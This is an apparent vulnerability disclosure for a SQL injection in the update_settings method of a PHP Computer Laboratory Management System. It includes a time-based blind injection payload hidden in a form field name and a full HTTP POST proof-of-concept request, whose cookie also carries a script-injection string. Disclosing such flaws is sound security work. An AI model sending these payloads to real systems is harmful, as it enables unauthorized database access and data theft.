#### There is a sql injection in the update_settings_info() method in the /classes/SystemSettings.php file of the Computer Laboratory Management System.

Key Code:

![QQ20240830-164624](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ20240830-164624.png)

The function iterates over the key-value pairs passed in by the post, and if the `$key` passed in exists in the system_info table, it executes the `update` sql statement, which filters for `$value`.

If it doesn't exist, the `insert` sql statement is executed, and you see that there is no filter for `$value` and `$key`, so you can splice and execute the malicious sql statement

**Vulnerability verification :** 

incoming statements for sql time blinding

```
name="'/**/or/**/(select(1)from(select(sleep(6)))x)#"
```

As shown in the figure, you can see that there is indeed a delay of 6 seconds.

![QQ20240830-173842](https://raw.githubusercontent.com/gaorenyusi/img/master/img/QQ20240830-173842.png)

poc

```
POST /classes/SystemSettings.php?f=update_settings HTTP/1.1
Host: phplms:98
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------274333682728242417833039075277
Content-Length: 218
Origin: http://localhost:98
Connection: keep-alive
Referer: http://localhost:98/admin/?page=system_info
Cookie: Phpstorm-9dbbfc29=4d9b54b0-3f53-4e67-ae29-a3fb9f021bbb; user=admin; name=aa%3Cscript%3Ealert%28111%29%3C%2Fscript%3E; mail=86226999%40qq.com; url=http%3A%2F%2F127.0.0.1; PHPSESSID=leagsbs030cq18dj30osfipt3t; XDEBUG_SESSION=11917
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

-----------------------------274333682728242417833039075277
Content-Disposition: form-data; name="'/**/or/**/(select(1)from(select(sleep(6)))x)#"

111
-----------------------------274333682728242417833039075277--
```
